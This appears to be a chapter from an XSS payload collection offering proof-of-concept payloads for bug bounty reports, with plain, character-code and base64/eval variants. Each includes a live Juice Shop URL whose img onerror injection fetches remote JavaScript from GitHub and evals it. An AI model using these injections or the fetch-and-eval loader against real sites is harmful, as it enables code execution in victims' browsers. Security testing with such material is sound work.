# Simple Proof of Concept (PoC)

<p align="justify">This chapter covers an important topic, related to confirming the existence and exploitability of an XSS vulnerability - providing a simple technical Proof of Concept (PoC).</p>

<p align="justify">For this purpose, for a long time across the technical IT security industry, <b><code>alert(1)</code></b> has been used, almost exclusively. As already <b>explained by LiveOverflow [1]</b> in detail, this is a <b>bad practice</b> and <b>should be avoided</b>.</p>

<p align="justify">The payloads documented here provide ready-to-use alternatives, all of which address the mentioned issue.</p>

* **NOTE**: this is not an exhaustive list - further options of modifying the payload exist
    * the payloads listed here serve the purpose of providing a proven fast and simple PoC for reporting XSS vulnerabilities (e.g. via Bug Bounty platforms)
        * any additional impact is to be demonstrated via additional PoC(s) (i.e. these one serve only as a quick check that the vulnerability exists on the affected web application - to pass initial triage)
    * depending on the scenario, one may work over another
        * overall, in most scenarios, at least one of them works
            * if not, explore available options for "saying the same in a different way" (i.e. adapt to target environment)
    * list may be updated with additional different variants

## `simpleStd.js` - round brackets; quote; space; backslash

```
alert('DOMAIN: '.concat(document.domain).concat('\nORIGIN: ').concat(window.origin));
```

* *(live example - OWASP juice shop - reflected XSS)*

    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22fetch('%2F%2Fraw.githubusercontent.com%2Flighthouseitsecurity%2FweaponizedXSS%2Frefs%2Fheads%2Fmain%2Fbasic%2FsimplePoC%2FsimpleStd.js').then(function(r)%7Breturn%20r.text().then(function(t)%7Breturn%20eval(t);%7D)%7D);%22%3E

## `simpleDec.js` - round brackets
```
alert(String.fromCharCode(68,79,77,65,73,78,58,32).concat(document.domain).concat(String.fromCharCode(10,79,82,73,71,73,78,58,32)).concat(window.origin));
```

* *(live example - OWASP juice shop - reflected XSS)*

    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22fetch('%2F%2Fraw.githubusercontent.com%2Flighthouseitsecurity%2FweaponizedXSS%2Frefs%2Fheads%2Fmain%2Fbasic%2FsimplePoC%2FsimpleDec.js').then(function(r)%7Breturn%20r.text().then(function(t)%7Breturn%20eval(t);%7D)%7D);%22%3E

## `simpleB64.js` - round brackets, quote, `eval()`
```
eval(atob('YWxlcnQoJ0RPTUFJTjogJy5jb25jYXQoZG9jdW1lbnQuZG9tYWluKS5jb25jYXQoJ1xuT1JJR0lOOiAnKS5jb25jYXQod2luZG93Lm9yaWdpbikpOwo='));
```

* *(live example - OWASP juice shop - reflected XSS)*

    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22fetch('%2F%2Fraw.githubusercontent.com%2Flighthouseitsecurity%2FweaponizedXSS%2Frefs%2Fheads%2Fmain%2Fbasic%2FsimplePoC%2FsimpleB64.js').then(function(r)%7Breturn%20r.text().then(function(t)%7Breturn%20eval(t);%7D)%7D);%22%3E

## References

* [https://liveoverflow.com/do-not-use-alert-1-in-xss/](https://liveoverflow.com/do-not-use-alert-1-in-xss/)
